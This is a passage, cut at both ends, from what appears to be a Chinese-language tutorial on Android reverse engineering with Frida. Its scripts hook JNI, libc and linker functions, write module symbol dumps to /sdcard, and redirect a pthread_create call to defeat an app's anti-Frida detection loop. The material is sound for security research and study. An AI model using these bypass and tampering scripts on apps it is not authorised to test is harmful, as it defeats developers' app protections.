&#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> replace<span class="hljs-constructor">_JNI()</span>&#123;<br>    var NewStringUTF_addr = null;<br>    var symbols = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Process</span>.</span></span>find<span class="hljs-constructor">ModuleByName(<span class="hljs-string">&quot;libart.so&quot;</span>)</span>.enumerate<span class="hljs-constructor">Symbols()</span><br>    <span class="hljs-comment">//console.log(JSON.stringify(symbols))</span><br>    <span class="hljs-keyword">for</span>(var i = <span class="hljs-number">0</span>;i&lt;symbols.length;i++)&#123;<br>        var symbol = symbols<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.name;<br>        <span class="hljs-keyword">if</span>((symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;CheckJNI&quot;</span>)</span>==-<span class="hljs-number">1</span>)&amp;&amp;(symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;JNI&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>))&#123;<br>            <span class="hljs-keyword">if</span>(symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;NewStringUTF&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>)&#123;<br>                console.log(<span class="hljs-string">&quot;finally found NewStringUTF_name :&quot;</span>,symbol);<br>                NewStringUTF_addr =symbols<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.address ;<br>                console.log(<span class="hljs-string">&quot;finally found NewStringUTF_addr :&quot;</span>,NewStringUTF_addr);<br>            &#125;<br>        &#125;<br>    &#125;<br>    var NewStringUTF = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(NewStringUTF_addr,<span class="hljs-string">&quot;pointer&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>])</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>replace(NewStringUTF_addr,<br>        <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeCallback(<span class="hljs-params">function</span>(<span class="hljs-params">parg1</span>,<span class="hljs-params">parg2</span>)</span>&#123;<br>            console.log(<span class="hljs-string">&quot;parg1,parg2=&gt;&quot;</span>,parg1,parg2.read<span class="hljs-constructor">CString()</span>);<br>            <span class="hljs-comment">// console.log(&#x27;CCCryptorCreate called from:\n&#x27; +</span><br>            <span class="hljs-comment">//  Thread.backtrace(this.context, Backtracer.ACCURATE)</span><br>            <span class="hljs-comment">//  .map(DebugSymbol.fromAddress).join(&#x27;\n&#x27;) + &#x27;\n&#x27;);</span><br>            var newPARG2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>alloc<span class="hljs-constructor">Utf8String(<span class="hljs-string">&quot;newPARG2&quot;</span>)</span><br>            var result = <span class="hljs-constructor">NewStringUTF(<span class="hljs-params">parg1</span>,<span class="hljs-params">newPARG2</span>)</span>;<br>            return result;<br>        &#125;,<span class="hljs-string">&quot;pointer&quot;</span>,<br>        <span class="hljs-literal">[&quot;<span class="hljs-identifier">pointer</span>&quot;,&quot;<span class="hljs-identifier">pointer</span>&quot;]</span>))<br>&#125;<br><br><span class="hljs-keyword">function</span> hook<span class="hljs-constructor">_RegisterNatives()</span>&#123;<br>    var RegisterNatives_addr = null;<br>    var symbols = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Process</span>.</span></span>find<span class="hljs-constructor">ModuleByName(<span class="hljs-string">&quot;libart.so&quot;</span>)</span>.enumerate<span class="hljs-constructor">Symbols()</span><br>    <span class="hljs-comment">//console.log(JSON.stringify(symbols))</span><br>    <span class="hljs-keyword">for</span>(var i = <span class="hljs-number">0</span>;i&lt;symbols.length;i++)&#123;<br>        var symbol = symbols<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.name;<br>        <span class="hljs-keyword">if</span>((symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;CheckJNI&quot;</span>)</span>==-<span class="hljs-number">1</span>)&amp;&amp;(symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;JNI&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>))&#123;<br>            <span class="hljs-keyword">if</span>(symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;RegisterNatives&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>)&#123;<br>                console.log(<span class="hljs-string">&quot;finally found RegisterNatives_name :&quot;</span>,symbol);<br>                RegisterNatives_addr =symbols<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.address ;<br>                console.log(<span class="hljs-string">&quot;finally found RegisterNatives_addr :&quot;</span>,RegisterNatives_addr);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(RegisterNatives_addr!=null)&#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>attach(RegisterNatives_addr,&#123;<br>            onEnter:<span class="hljs-keyword">function</span>(args)&#123;<br>                console.log(<span class="hljs-string">&quot;[RegisterNatives]method counts :&quot;</span>,args<span class="hljs-literal">[<span class="hljs-number">3</span>]</span>);<br>                var env = args<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;<br>                var jclass = args<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>;<br>                var class_name = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>vm.<span class="hljs-keyword">try</span><span class="hljs-constructor">GetEnv()</span>.get<span class="hljs-constructor">ClassName(<span class="hljs-params">jclass</span>)</span>;<br>                var methods_ptr = ptr(args<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>);<br>                var method_count = parse<span class="hljs-constructor">Int(<span class="hljs-params">args</span>[3])</span>;<br>                <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; method_count; i++) &#123;<br>                    var name_ptr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>read<span class="hljs-constructor">Pointer(<span class="hljs-params">methods_ptr</span>.<span class="hljs-params">add</span>(<span class="hljs-params">i</span> <span class="hljs-operator">*</span> Process.<span class="hljs-params">pointerSize</span> <span class="hljs-operator">*</span> 3)</span>);<br>                    var sig_ptr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>read<span class="hljs-constructor">Pointer(<span class="hljs-params">methods_ptr</span>.<span class="hljs-params">add</span>(<span class="hljs-params">i</span> <span class="hljs-operator">*</span> Process.<span class="hljs-params">pointerSize</span> <span class="hljs-operator">*</span> 3 + Process.<span class="hljs-params">pointerSize</span>)</span>);<br>                    var fnPtr_ptr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>read<span class="hljs-constructor">Pointer(<span class="hljs-params">methods_ptr</span>.<span class="hljs-params">add</span>(<span class="hljs-params">i</span> <span class="hljs-operator">*</span> Process.<span class="hljs-params">pointerSize</span> <span class="hljs-operator">*</span> 3 + Process.<span class="hljs-params">pointerSize</span> <span class="hljs-operator">*</span> 2)</span>);<br>                    var name = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>read<span class="hljs-constructor">CString(<span class="hljs-params">name_ptr</span>)</span>;<br>                    var <span class="hljs-keyword">sig</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>read<span class="hljs-constructor">CString(<span class="hljs-params">sig_ptr</span>)</span>;<br>                    var find_module = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Process</span>.</span></span>find<span class="hljs-constructor">ModuleByAddress(<span class="hljs-params">fnPtr_ptr</span>)</span>;<br>                    console.log(<span class="hljs-string">&quot;[RegisterNatives] java_class:&quot;</span>, class_name, <span class="hljs-string">&quot;name:&quot;</span>, name, <span class="hljs-string">&quot;sig:&quot;</span>, <span class="hljs-keyword">sig</span>, <span class="hljs-string">&quot;fnPtr:&quot;</span>, fnPtr_ptr, <span class="hljs-string">&quot;module_name:&quot;</span>, find_module.name, <span class="hljs-string">&quot;module_base:&quot;</span>, find_module.base, <span class="hljs-string">&quot;offset:&quot;</span>, ptr(fnPtr_ptr).sub(find_module.base));<br>                &#125;<br>            &#125;,onLeave:<span class="hljs-keyword">function</span>(retval)&#123;<br>            &#125;<br>        &#125;)<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        console.log(<span class="hljs-string">&quot;didn`t found RegisterNatives address&quot;</span>)<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="libc框架层的hook利用"><a href="#libc框架层的hook利用" class="headerlink" title="libc框架层的hook利用"></a>libc框架层的hook利用</h1><p><strong>libc函数符号hook</strong></p><p><strong>libc函数参数、返回值打印和替换</strong></p><p><strong>主动调用libc读写文件</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-keyword">begin</span><span class="hljs-constructor">Anti()</span>&#123;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>perform(<span class="hljs-keyword">function</span><span class="hljs-literal">()</span>&#123;    <br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>choose(<span class="hljs-string">&quot;com.example.demoso1.MainActivity&quot;</span>,&#123;<br>        onMatch:<span class="hljs-keyword">function</span>(instance)&#123;<br>            console.log(<span class="hljs-string">&quot;Found instance!&quot;</span>);<br>            instance.init<span class="hljs-literal">()</span>;<br>        &#125;,onComplete:<span class="hljs-keyword">function</span><span class="hljs-literal">()</span>&#123;console.log(<span class="hljs-string">&quot;Search complete!&quot;</span>)&#125;<br>    &#125;)<br>&#125;)    <br>&#125;<br><br><span class="hljs-keyword">function</span> hook<span class="hljs-constructor">_pthread()</span>&#123;<br><br>    var pthread_create_addr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;pthread_create&quot;</span>)</span>;<br>    var time_addr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>)</span>;<br>    console.log(<span class="hljs-string">&quot;pthread_create_addr=&gt;&quot;</span>,pthread_create_addr)<br><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>attach(pthread_create_addr,&#123;<br>        onEnter:<span class="hljs-keyword">function</span>(args)&#123;<br>            console.log(<span class="hljs-string">&quot;args=&gt;&quot;</span>,args<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>,args<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>,args<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>,args<span class="hljs-literal">[<span class="hljs-number">4</span>]</span>)<br>            var libnativebaseaddress = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">BaseAddress(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>)</span><br>            <span class="hljs-keyword">if</span>(libnativebaseaddress!=null)&#123;<br>                console.log(<span class="hljs-string">&quot;libnativebaseaddress=&gt;&quot;</span>,libnativebaseaddress);<br>                <span class="hljs-comment">//var detect_frida_loop_addr = args[2]-libnativebaseaddress;</span><br>                <span class="hljs-comment">//console.log(&quot;detect_frida_loop offset is =&gt;&quot;,detect_frida_loop_addr)</span><br>                <span class="hljs-keyword">if</span>(args<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>-libnativebaseaddress<span class="hljs-operator"> == </span><span class="hljs-number">64900</span>)&#123;<br>                    console.log(<span class="hljs-string">&quot;found anti frida loop!,excute time_addr=&gt;&quot;</span>,time_addr);<br>                    args<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>=time_addr;<br>                &#125;<br>            &#125;<br>        &#125;,onLeave:<span class="hljs-keyword">function</span>(retval)&#123;<br>            console.log(<span class="hljs-string">&quot;retval is =&gt;&quot;</span>,retval)<br>        &#125;<br>    &#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> replace<span class="hljs-constructor">_pthread()</span>&#123;<br>    var pthread_create_addr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;pthread_create&quot;</span>)</span>;<br>    console.log(<span class="hljs-string">&quot;pthread_create_addr=&gt;&quot;</span>,pthread_create_addr)<br>    var pthread_create = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(<span class="hljs-params">pthread_create_addr</span>,<span class="hljs-string">&quot;int&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>])</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>replace(pthread_create_addr,<br>        <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeCallback(<span class="hljs-params">function</span>(<span class="hljs-params">parg1</span>,<span class="hljs-params">parg2</span>,<span class="hljs-params">parg3</span>,<span class="hljs-params">parg4</span>)</span>&#123;<br>            console.log(parg1,parg2,parg3,parg4)     <br>            var libnativebaseaddress = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">BaseAddress(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>)</span><br>            <span class="hljs-keyword">if</span>(libnativebaseaddress!=null)&#123;<br>                console.log(<span class="hljs-string">&quot;libnativebaseaddress=&gt;&quot;</span>,libnativebaseaddress);<br>                <span class="hljs-keyword">if</span>(parg3-libnativebaseaddress<span class="hljs-operator"> == </span><span class="hljs-number">64900</span>)&#123;<br>                    return null;<br>                &#125;<br>            &#125;      <br>            return pthread<span class="hljs-constructor">_create(<span class="hljs-params">parg1</span>,<span class="hljs-params">parg2</span>,<span class="hljs-params">parg3</span>,<span class="hljs-params">parg4</span>)</span><br>        &#125;,<span class="hljs-string">&quot;int&quot;</span>,<span class="hljs-literal">[&quot;<span class="hljs-identifier">pointer</span>&quot;,&quot;<span class="hljs-identifier">pointer</span>&quot;,&quot;<span class="hljs-identifier">pointer</span>&quot;,&quot;<span class="hljs-identifier">pointer</span>&quot;]</span>))<br>&#125;<br><br><span class="hljs-keyword">function</span> write<span class="hljs-constructor">Something(<span class="hljs-params">path</span>,<span class="hljs-params">contents</span>)</span>&#123;<br>    var fopen_addr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>)</span>;<br>    var fputs_addr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fputs&quot;</span>)</span>;<br>    var fclose_addr = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fclose&quot;</span>)</span>;<br><br>    <span class="hljs-comment">//console.log(&quot;fopen=&gt;&quot;,fopen_addr,&quot;  fputs=&gt;&quot;,fputs_addr,&quot;  fclose=&gt;&quot;,fclose_addr);</span><br><br>    var fopen = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(<span class="hljs-params">fopen_addr</span>,<span class="hljs-string">&quot;pointer&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>])</span><br>    var fputs = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(<span class="hljs-params">fputs_addr</span>,<span class="hljs-string">&quot;int&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>])</span><br>    var fclose = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(<span class="hljs-params">fclose_addr</span>,<span class="hljs-string">&quot;int&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>])</span><br><br>    console.log(path,contents)<br><br>    var fileName = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>alloc<span class="hljs-constructor">Utf8String(<span class="hljs-params">path</span>)</span>;<br>    var mode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>alloc<span class="hljs-constructor">Utf8String(<span class="hljs-string">&quot;a+&quot;</span>)</span>;<br><br>    var fp = fopen(fileName,mode);<br><br>    var contentHello = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>alloc<span class="hljs-constructor">Utf8String(<span class="hljs-params">contents</span>)</span>;<br>    var ret = fputs(contentHello,fp)<br>    <br>    fclose(fp);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-constructor">EnumerateAllExports()</span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    var packageName = null </span><br><span class="hljs-comment">    Java.perform(function()&#123;</span><br><span class="hljs-comment">        packageName = Java.use(&#x27;android.app.ActivityThread&#x27;).currentApplication().getApplicationContext().getPackageName();</span><br><span class="hljs-comment">        console.log(&quot;package name is :&quot;,packageName)</span><br><span class="hljs-comment">    &#125;)</span><br><span class="hljs-comment">    if(!packageName)&#123;</span><br><span class="hljs-comment">        console.log(&quot;can`t get package name ,quitting .&quot;)</span><br><span class="hljs-comment">        return null;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br><br>    var modules = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Process</span>.</span></span>enumerate<span class="hljs-constructor">Modules()</span>;<br>    <span class="hljs-comment">//console.log(&quot;Process.enumerateModules =&gt; &quot;,JSON.stringify(modules))</span><br>    <span class="hljs-keyword">for</span>(var i=<span class="hljs-number">0</span>;i&lt;modules.length;i++)&#123;<br>        var <span class="hljs-keyword">module</span> = modules<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;<br>        var module_name = modules<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.name;<br>        <span class="hljs-comment">//var exports = module.enumerateExports();</span><br>        var exports = <span class="hljs-keyword">module</span>.enumerate<span class="hljs-constructor">Symbols()</span>;<br>        console.log(<span class="hljs-string">&quot;module_name=&gt;&quot;</span>,module_name,<span class="hljs-string">&quot;  module.enumerateExports = &gt; &quot;</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>stringify(exports))<br>        <span class="hljs-keyword">for</span>(var m =<span class="hljs-number">0</span>; m&lt;exports.length;m++)&#123;<br>            console.log(<span class="hljs-string">&quot;m=&gt;&quot;</span>,m)<br>            <span class="hljs-comment">//writeSomething(&quot;/sdcard/&quot;+packageName+&quot;/&quot;+module_name+&quot;.txt&quot;, &quot;type:&quot;+exports[m].type+ &quot; name:&quot;+ exports[m].name+&quot; address:&quot;+exports[m].address+&quot;\n&quot;)</span><br>            write<span class="hljs-constructor">Something(<span class="hljs-string">&quot;/sdcard/settings/&quot;</span>+<span class="hljs-params">module_name</span>+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;type:&quot;</span>+<span class="hljs-params">exports</span>[<span class="hljs-params">m</span>].<span class="hljs-params">type</span>+ <span class="hljs-string">&quot; name:&quot;</span>+ <span class="hljs-params">exports</span>[<span class="hljs-params">m</span>].<span class="hljs-params">name</span>+<span class="hljs-string">&quot; address:&quot;</span>+<span class="hljs-params">exports</span>[<span class="hljs-params">m</span>].<span class="hljs-params">address</span>+<span class="hljs-string">&quot;\n&quot;</span>)</span><br>        &#125;<br>        <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="linker框架层的Hook和利用"><a href="#linker框架层的Hook和利用" class="headerlink" title="linker框架层的Hook和利用"></a>linker框架层的Hook和利用</h1><p><strong>init_array原理so加载执行流程</strong></p><p><strong>hook_linker init_array 自吐</strong></p> <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs lua">//应用以<span class="hljs-number">32</span>位在<span class="hljs-number">64</span>位终端环境下运行<br>//adb install <span class="hljs-comment">--abi armeabi-v7a &lt;path to apk&gt;</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook_pthread</span><span class="hljs-params">()</span></span> &#123;<br><br>    var pthread_create_addr = Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;pthread_create&quot;</span>);<br>    var time_addr = Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>);<br>    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;pthread_create_addr=&gt;&quot;</span>, pthread_create_addr)<br><br>    Interceptor.attach(pthread_create_addr, &#123;<br>        onEnter: <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(args)</span></span> &#123;<br>            console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;args=&gt;&quot;</span>, args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">4</span>])<br>            var libnativebaseaddress = Module.findBaseAddress(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>)<br>            <span class="hljs-keyword">if</span> (libnativebaseaddress != null) &#123;<br>                console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;libnativebaseaddress=&gt;&quot;</span>, libnativebaseaddress);<br>                //var detect_frida_loop_addr = args[<span class="hljs-number">2</span>]-libnativebaseaddress;<br>                //console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;detect_frida_loop offset is =&gt;&quot;</span>,detect_frida_loop_addr)<br>                <span class="hljs-keyword">if</span> (args[<span class="hljs-number">2</span>] - libnativebaseaddress == <span class="hljs-number">0x95c9</span>) &#123;<br>                    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;found anti frida loop!,excute time_addr=&gt;&quot;</span>, time_addr);<br>                    args[<span class="hljs-number">2</span>] = time_addr;<br>                &#125;<br>            &#125;<br>        &#125;, onLeave: <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(retval)</span></span> &#123;<br>            console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;retval is =&gt;&quot;</span>, retval)<br>        &#125;<br>    &#125;)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">EnumerateAllExports</span><span class="hljs-params">()</span></span> &#123;<br><br>    var linker = Process.getModuleByName(<span class="hljs-string">&quot;linker&quot;</span>)<br>    //console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;exports=&gt;&quot;</span>,JSON.stringify(linker.enumerateSymbols()))<br>    var call_function_addr = null;<br>    var exports = linker.enumerateSymbols();<br>    //console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;module_name=&gt;&quot;</span>,module_name,<span class="hljs-string">&quot;  module.enumerateExports = &gt; &quot;</span>,JSON.stringify(exports))<br>    <span class="hljs-keyword">for</span> (var m = <span class="hljs-number">0</span>; m &lt; exports.length; m++) &#123;<br>        //console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;m=&gt;&quot;</span>,m)<br>        //writeSomething(<span class="hljs-string">&quot;/sdcard/&quot;</span>+packageName+<span class="hljs-string">&quot;/&quot;</span>+module_name+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;type:&quot;</span>+exports[m].<span class="hljs-built_in">type</span>+ <span class="hljs-string">&quot; name:&quot;</span>+ exports[m].name+<span class="hljs-string">&quot; address:&quot;</span>+exports[m].address+<span class="hljs-string">&quot;\n&quot;</span>)<br>        //writeSomething(<span class="hljs-string">&quot;/sdcard/settings/&quot;</span>+module_name+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;type:&quot;</span>+exports[m].<span class="hljs-built_in">type</span>+ <span class="hljs-string">&quot; name:&quot;</span>+ exports[m].name+<span class="hljs-string">&quot; address:&quot;</span>+exports[m].address+<span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> (exports[m].name == <span class="hljs-string">&quot;__dl__ZL13call_functionPKcPFviPPcS2_ES0_&quot;</span>) &#123;<br>            call_function_addr = exports[m].address;<br>            console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;found call_function_addr =&gt; &quot;</span>, call_function_addr)<br>            hook_call_function(call_function_addr)<br>        &#125;<br>    &#125;<br>    /*<br>    __dl__ZL13call_functionPKcPFvvES0_<br>    __dl_call_function(<span class="hljs-built_in">char</span> const*, void (*)(), <span class="hljs-built_in">char</span> const*)<br><br><br>    __dl__ZL13call_functionPKcPFviPPcS2_ES0_<br>    __dl_call_function(<span class="hljs-built_in">char</span> const*, void (*)(int, <span class="hljs-built_in">char</span>**, <span class="hljs-built_in">char</span>**), <span class="hljs-built_in">char</span> const*)<br>    */<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook_call_function</span><span class="hljs-params">(_call_function_addr)</span></span>&#123;<br>    console.<span class="hljs-built_in">log</span>(<span 